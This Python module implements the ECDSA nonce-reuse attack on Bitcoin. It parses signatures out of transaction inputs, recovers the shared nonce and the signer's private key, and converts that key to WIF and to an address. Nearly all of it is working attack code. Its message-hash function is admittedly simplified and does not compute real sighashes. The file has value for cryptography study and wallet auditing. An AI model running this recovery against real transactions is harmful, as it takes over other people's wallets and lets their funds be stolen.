import hashlib
import re
import base58
from typing import Tuple, Optional, Dict, Any
from ecdsa import SECP256k1
from ecdsa.numbertheory import inverse_mod

# SECP256K1 curve order
SECP256K1_N = SECP256k1.order

def modinv(a: int, n: int) -> int:
    """Compute modular inverse using ecdsa library's optimized implementation"""
    return inverse_mod(a, n)

def recover_nonce_from_signatures(h1: int, h2: int, s1: int, s2: int, r: int, n: int) -> int:
    """
    Recover the nonce (k) from two signatures that reused the same nonce.
    
    Based on the mathematical relationship:
    k = (s1-s2)^-1 * (H(M1) - H(M2)) mod n
    
    When the same nonce k is used for two different messages:
    s1 = k^-1 * (H(M1) + r * privateKey) mod n
    s2 = k^-1 * (H(M2) + r * privateKey) mod n
    
    Subtracting: (s1-s2) = k^-1 * (H(M1) - H(M2)) mod n
    Therefore: k = (s1-s2)^-1 * (H(M1) - H(M2)) mod n
    """
    try:
        s_diff = (s1 - s2) % n
        h_diff = (h1 - h2) % n
        
        if s_diff == 0:
            raise ValueError("s1 and s2 are identical - no nonce reuse or same message")
        
        k = (inverse_mod(s_diff, n) * h_diff) % n
        return k
    except Exception as e:
        raise ValueError(f"Nonce recovery failed: {e}")

def recover_private_key_from_nonce_reuse(h1: int, h2: int, s1: int, s2: int, r1: int, r2: int, n: int) -> int:
    """
    Recover the private key via nonce reuse attack.
    
    This implements the complete ECDSA nonce reuse attack as described in:
    - pcaversaccio/ecdsa-nonce-reuse-attack
    - NotSoSecure ECDSA Nonce Reuse Attack documentation
    
    The attack works in two steps:
    1. First recover the nonce k from the two signatures
    2. Then recover the private key using the known nonce
    
    Mathematical foundation:
    When k is reused: r1 = r2 = r (x-coordinate of k*G)
    s1 = k^-1 * (h1 + r * privateKey) mod n
    s2 = k^-1 * (h2 + r * privateKey) mod n
    
    Recovery formulas:
    k = (s1-s2)^-1 * (h1-h2) mod n
    privateKey = r^-1 * (s1*k - h1) mod n
    
    Parameters:
        h1, h2: Message hashes (z values)
        s1, s2: Signature s parameters
        r1, r2: Signature r parameters (should be equal for nonce reuse)
        n: Curve order
        
    Returns:
        Recovered private key as integer
        
    Raises:
        AssertionError: If r1 != r2 (no nonce reuse detected)
        ValueError: If calculation fails
    """
    if r1 != r2:
        raise AssertionError("No ECDSA nonce reuse detected - r values are different")
    
    r = r1  # Since r1 == r2
    
    try:
        # Step 1: Recover the nonce k
        k = recover_nonce_from_signatures(h1, h2, s1, s2, r, n)
        
        # Step 2: Recover the private key using the known nonce
        # From: s1 = k^-1 * (h1 + r * privateKey) mod n
        # Rearranging: privateKey = r^-1 * (s1 * k - h1) mod n
        private_key = (inverse_mod(r, n) * ((s1 * k - h1) % n)) % n
        
        # Validate the recovered key is in valid range
        if not validate_recovered_private_key(private_key):
            raise ValueError("Recovered private key is out of valid range")
        
        return private_key
        
    except Exception as e:
        raise ValueError(f"Private key recovery failed: {e}")

def verify_recovered_private_key(private_key: int, h: int, r: int, s: int, n: int) -> bool:
    """
    Verify that a recovered private key is correct by checking if it produces
    the expected signature values when used to sign the same message hash.
    
    This reconstructs the signature verification process:
    1. Calculate public key point: publicKey = privateKey * G
    2. Verify: r' == r where r' is x-coordinate of verification calculation
    """
    try:
        from ecdsa import SigningKey, SECP256k1
        
        # Create signing key from recovered private key
        sk = SigningKey.from_secret_exponent(private_key, curve=SECP256k1)
        vk = sk.verifying_key
        
        # Perform signature verification calculation
        s_inv = inverse_mod(s, n)
        u1 = (h * s_inv) % n
        u2 = (r * s_inv) % n
        
        # Calculate point: u1*G + u2*publicKey
        # This should give us a point where x-coordinate equals r
        G = SECP256k1.generator
        publicKey_point = vk.pubkey.point
        
        verification_point = u1 * G + u2 * publicKey_point
        r_calculated = verification_point.x() % n
        
        return r_calculated == r
        
    except Exception:
        return False

def validate_bitcoin_address(address: str) -> bool:
    """Validate Bitcoin address format (Legacy, SegWit, Bech32)"""
    if not address:
        return False
    
    # Legacy address (P2PKH/P2SH)
    if address.startswith(('1', '3')):
        try:
            decoded = base58.b58decode(address)
            if len(decoded) != 25:
                return False
            # Verify checksum
            checksum = hashlib.sha256(hashlib.sha256(decoded[:-4]).digest()).digest()[:4]
            return checksum == decoded[-4:]
        except:
            return False
    
    # Bech32 address (P2WPKH/P2WSH)
    elif address.startswith(('bc1', 'tb1')):
        # Basic bech32 validation
        if len(address) < 14 or len(address) > 74:
            return False
        return re.match(r'^[a-z0-9]+$', address.lower()) is not None
    
    return False

def parse_signature(vin: Dict[str, Any]) -> Optional[str]:
    """
    Parse signature from transaction input
    Handles both legacy scriptSig and witness data
    """
    # Try witness data first (SegWit)
    if 'witness' in vin and vin['witness']:
        for witness_item in vin['witness']:
            if len(witness_item) > 100:  # Likely a signature
                return witness_item
    
    # Try scriptSig (Legacy) - check multiple field names
    script_hex = None
    if 'scriptSig' in vin and 'hex' in vin['scriptSig']:
        script_hex = vin['scriptSig']['hex']
    elif 'scriptsig' in vin:
        script_hex = vin['scriptsig']
    elif 'scriptSig' in vin and isinstance(vin['scriptSig'], str):
        script_hex = vin['scriptSig']
    
    if script_hex and len(script_hex) > 100:  # Contains signature
        return script_hex
    
    return None

def extract_r_s(sig_hex: str) -> Tuple[int, int]:
    """
    Extract r and s values from DER-encoded signature
    """
    if not sig_hex:
        raise ValueError("Empty signature")
    
    try:
        # Convert hex to bytes
        sig_bytes = bytes.fromhex(sig_hex)
        
        # Find DER signature in the data
        # DER signatures start with 0x30
        der_start = -1
        for i in range(len(sig_bytes)):
            if sig_bytes[i] == 0x30:
                der_start = i
                break
        
        if der_start == -1:
            raise ValueError("No DER signature found")
        
        sig_data = sig_bytes[der_start:]
        
        if len(sig_data) < 8:
            raise ValueError("Signature too short")
        
        # Parse DER format
        if sig_data[0] != 0x30:
            raise ValueError("Invalid DER signature")
        
        sig_len = sig_data[1]
        
        # Handle long form length encoding
        if sig_len & 0x80:
            len_bytes = sig_len & 0x7f
            if len_bytes == 0 or len_bytes > 4:
                raise ValueError("Invalid length encoding")
            sig_len = 0
            for i in range(len_bytes):
                sig_len = (sig_len << 8) | sig_data[2 + i]
            header_len = 2 + len_bytes
        else:
            header_len = 2
        
        if len(sig_data) < sig_len + header_len:
            raise ValueError("Invalid signature length")
        
        # Parse r value
        r_start = header_len
        if sig_data[r_start] != 0x02:
            raise ValueError("Invalid r marker")
        
        r_len = sig_data[r_start + 1]
        
        # Handle long form for r length
        if r_len & 0x80:
            len_bytes = r_len & 0x7f
            if len_bytes == 0 or len_bytes > 4:
                raise ValueError("Invalid r length encoding")
            r_len = 0
            for i in range(len_bytes):
                r_len = (r_len << 8) | sig_data[r_start + 2 + i]
            r_data_start = r_start + 2 + len_bytes
        else:
            r_data_start = r_start + 2
        
        r_bytes = sig_data[r_data_start:r_data_start + r_len]
        r = int.from_bytes(r_bytes, byteorder='big')
        
        # Parse s value
        s_start = r_data_start + r_len
        if s_start >= len(sig_data) or sig_data[s_start] != 0x02:
            raise ValueError("Invalid s marker")
        
        s_len = sig_data[s_start + 1]
        
        # Handle long form for s length
        if s_len & 0x80:
            len_bytes = s_len & 0x7f
            if len_bytes == 0 or len_bytes > 4:
                raise ValueError("Invalid s length encoding")
            s_len = 0
            for i in range(len_bytes):
                s_len = (s_len << 8) | sig_data[s_start + 2 + i]
            s_data_start = s_start + 2 + len_bytes
        else:
            s_data_start = s_start + 2
        
        s_bytes = sig_data[s_data_start:s_data_start + s_len]
        s = int.from_bytes(s_bytes, byteorder='big')
        
        return r, s
    
    except Exception as e:
        raise ValueError(f"Failed to extract r,s: {e}")

def compute_z(raw_tx_hex: str) -> int:
    """
    Compute message hash (z) for transaction
    This is a simplified version - in practice, this depends on
    the specific input being signed and the signature type
    """
    try:
        # Convert hex to bytes
        tx_bytes = bytes.fromhex(raw_tx_hex)
        
        # Double SHA256 (simplified - real implementation needs proper sighash)
        hash1 = hashlib.sha256(tx_bytes).digest()
        hash2 = hashlib.sha256(hash1).digest()
        
        # Convert to integer
        z = int.from_bytes(hash2, byteorder='big')
        
        return z
    
    except Exception as e:
        raise ValueError(f"Failed to compute z: {e}")

def private_key_to_wif(private_key: int, compressed: bool = True, testnet: bool = False) -> str:
    """Convert private key to Wallet Import Format (WIF)"""
    try:
        # Convert to 32-byte hex
        key_hex = f"{private_key:064x}"
        key_bytes = bytes.fromhex(key_hex)
        
        # Add version byte
        if testnet:
            extended = b'\xef' + key_bytes
        else:
            extended = b'\x80' + key_bytes
        
        # Add compression flag
        if compressed:
            extended += b'\x01'
        
        # Add checksum
        checksum = hashlib.sha256(hashlib.sha256(extended).digest()).digest()[:4]
        final = extended + checksum
        
        return base58.b58encode(final).decode()
    
    except Exception as e:
        raise ValueError(f"Failed to convert to WIF: {e}")

def validate_recovered_private_key(private_key: int) -> bool:
    """
    Validate that a recovered private key is within the valid SECP256k1 range
    """
    return 0 < private_key < SECP256K1_N

def private_key_to_bitcoin_address(private_key: int, compressed: bool = True, testnet: bool = False) -> str:
    """
    Convert private key to Bitcoin address for verification purposes
    """
    try:
        from ecdsa import SigningKey
        from ecdsa.curves import SECP256k1
        import hashlib
        
        # Create signing key from private key
        sk = SigningKey.from_secret_exponent(private_key, curve=SECP256k1)
        vk = sk.verifying_key
        
        # Get public key point
        public_key_point = vk.pubkey.point
        
        if compressed:
            # Compressed public key format
            if public_key_point.y() % 2 == 0:
                public_key_bytes = b'\x02' + public_key_point.x().to_bytes(32, 'big')
            else:
                public_key_bytes = b'\x03' + public_key_point.x().to_bytes(32, 'big')
        else:
            # Uncompressed public key format
            public_key_bytes = b'\x04' + public_key_point.x().to_bytes(32, 'big') + public_key_point.y().to_bytes(32, 'big')
        
        # Create Bitcoin address
        sha256_hash = hashlib.sha256(public_key_bytes).digest()
        ripemd160_hash = hashlib.new('ripemd160', sha256_hash).digest()
        
        # Add version byte
        version_byte = b'\x6f' if testnet else b'\x00'  # 0x6f for testnet, 0x00 for mainnet
        extended_hash = version_byte + ripemd160_hash
        
        # Add checksum
        checksum = hashlib.sha256(hashlib.sha256(extended_hash).digest()).digest()[:4]
        final_address = extended_hash + checksum
        
        return base58.b58encode(final_address).decode()
        
    except Exception as e:
        raise ValueError(f"Failed to convert private key to address: {e}")
